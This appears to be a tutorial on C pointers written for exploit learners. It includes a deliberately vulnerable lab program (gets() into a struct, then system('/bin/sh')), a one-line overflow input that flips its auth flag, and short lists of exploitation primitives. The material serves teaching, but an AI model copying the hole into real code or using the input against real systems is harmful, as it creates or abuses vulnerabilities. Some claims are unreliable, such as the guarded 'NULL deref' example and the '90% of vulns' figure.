# Pointers

## **What Are Pointers?**
**Pointers are variables that store **memory addresses****. They enable **indirect access** to data.

```
Memory Layout Example:
Addr:  0x7fff...1000  0x7fff...1004  0x7fff...1008
Data:     [42]         [buf: 'A']    [ret_addr]
Ptr:   int *p = 0x7fff...1000;  // p holds ADDRESS, not value
```

**Syntax**:
```c
int x = 42;
int *p = &x;     // p = address of x (0x7fff...1000)
int **pp = &p;   // Pointer to pointer
```

**Core Truth**: `*p` = **dereference** (get value at address `p`).

## **Why Use Pointers? (MUST Reasons)**
| Reason | Example | Without Pointers? |
|--------|---------|-------------------|
| **Pass large data** | `void swap(int *a, int *b)` | Copy entire array? Impossible. |
| **Dynamic memory** | `int *arr = malloc(n * sizeof(int))` | Fixed-size only. |
| **Functions return data** | `void get_bounds(int *min, int *max)` | Single return value limit. |
| **Strings/arrays** | `char *str = "hello"` | Manual indexing hell. |
| **Hardware access** | `*(int*)0x400000 = 42` | Direct memory mapped I/O. |

**Pentest Reality**: 90% of vulns are **pointer bugs** (deref null, UAF, overflows).

## **Pointer Operators**
| Operator | Syntax | Action | Example |
|----------|--------|--------|---------|
| `&` **Address-of** | `&x` | Get address | `int *p = &x` |
| `*` **Dereference** | `*p` | Value at addr | `*p = 99` (x becomes 99) |
| `->` **Struct access** | `ptr->field` | `(*ptr).field` | Linked list traversal |
| `[]` **Array** | `ptr[5]` | `*(ptr + 5)` | Array pointer equivalence |

## **1. Basic Addressing & Dereference**
```c
int x = 42, y = 99;
int *p = &x;     // p holds 0x1000

printf("%p\n", (void*)p);  // 0x7fff...1000
printf("%d\n", *p);        // 42 (dereference)
*p = 100;                  // x now 100
p = &y;                    // Re-point to y
```

**Memory Visualization**:
```
Before: x@0x1000=[42]  y@0x1004=[99]  p@0x1008=[0x1000]
After *p=100: x@0x1000=[100] p@0x1008=[0x1000]
After p=&y: p@0x1008=[0x1004]
```

## **2. Pointer Arithmetic (CRITICAL for Exploits)**
Pointers auto-scale by **type size**.

| Type | `p+1` advances | Example |
|------|----------------|---------|
| `char*` | +1 byte | String traversal |
| `int*` | +4 bytes | Array indexing |
| `double*` | +8 bytes | Precise heap spraying |

```c
int arr[] = {10, 20, 30};
int *p = arr;      // p == &arr[0]

printf("%d\n", *p);     // 10
printf("%d\n", *(p+1)); // 20 (arr[1])
printf("%d\n", p[2]);   // 30 (same as *(p+2))

p += 1;                // Now points to arr[1]
```

**Pentest Gold**: Off-by-one → `p[-1]` reads previous struct (info leak).

## **3. Array-Pointer Equivalence**
```
int arr[5];  arr == &arr[0]  TRUE
arr[3] == *(arr + 3)  TRUE
```

**String Special Case**:
```c
char *str = "hello";
str[1] = 'X';  // SEGFAULT (read-only literal)
char buf[] = "hello";  // Modifiable copy
```

## **4. Multi-Level Pointers**
| Level | Name | Use Case | Vuln |
|-------|------|----------|------|
| `*` | Pointer | Arrays, dynamic alloc | Dangling, null deref |
| `**` | Pointer-to-pointer | `argv`, dynamic arrays | Double-free |
| `***` | Pointer-to-(ptr-to-ptr) | Trees, ASTs | Complex UAF chains |

```c
char **argv;           // Array of string pointers
char *names[] = {"foo", "bar"};
argv = names;          // argv[0] = "foo"
```

## **5. Common Pointer Patterns & Vulns**
| Pattern | Code | Vuln Class | Exploit |
|---------|------|------------|---------|
| **NULL Deref** | `if(ptr) *ptr = 42;` | Crash/DoS | `ptr=NULL` |
| **Dangling** | `free(p); *p=42;` | UAF | Heap overwrite |
| **Off-by-One** | `p[-1]` | Info leak | Canary/prev chunk |
| **Type Confusion** | `int* pi = (int*)str;` | Corruption | Integer overlay |
| **Uninit Pointer** | `int *p; *p=42;` | Wild deref | Code exec |

## **6. Pointer Exploitation Lab**
```c
// vuln.c - gcc -fno-stack-protector -z execstack
struct User {
    char name[32];
    int auth;      // 0=no, 1=yes
};

void login(struct User *u) {
    gets(u->name);  // Overflow → auth overwrite
    if(u->auth == 1) system("/bin/sh");
}

int main() {
    struct User admin = {"admin", 0};
    login(&admin);
}
```

**Exploit** (32-byte overflow):
```
$ python3 -c 'print("A"*32 + "\x01\x00\x00\x00")' | ./vuln
# auth=1 → shell
```

**Heap Variant**:
```c
struct User *u = malloc(sizeof(struct User));
strcpy(u->name, long_input);  // Overwrite next chunk metadata
```

## **7. Pointer Debugging Commands**
```
gdb ./vuln
(gdb) break login
(gdb) run
(gdb) x/10gx $rsp     # Hex dump stack
(gdb) p/x &admin.auth # Exact offset
(gdb) disas login     # See overflow target
```

## **Pointer Arithmetic Exploits**
```
1. p = buf; p[-8]  → leak canary
2. p = &auth; p[32] → overflow to win()
3. *(p+0x10) = 1   → precise write
```

**Golden Rule**: `*(uint64_t*)(base + offset) = value` → arbitrary write primitive.

**Memory Map** (proc/self/maps):
```
0x7f...0000 r-xp  /lib64/libc.so  # ROP gadgets
0x7f...2000 rw-p   [heap]         # Spray target
0x7fff...0000 rw-p   [stack]      # Buffer paradise
```

**Next**: "Dynamic memory (malloc/free) exploits", "pointer arithmetic attacks", or "struct pointer vulns"?

